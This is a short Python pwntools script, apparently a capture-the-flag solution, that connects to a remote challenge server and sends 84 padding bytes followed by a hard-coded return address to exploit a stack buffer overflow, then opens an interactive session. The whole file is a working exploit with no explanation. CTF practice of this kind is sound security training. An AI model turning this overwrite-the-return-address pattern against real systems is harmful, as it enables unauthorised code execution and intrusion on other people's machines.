from pwn import *
#p = process('./chall')
p = remote('stembactf.space', 5202)
payload = b'A' * 84
payload += p32(0x08049203)

p.sendline(payload)

p.interactive()
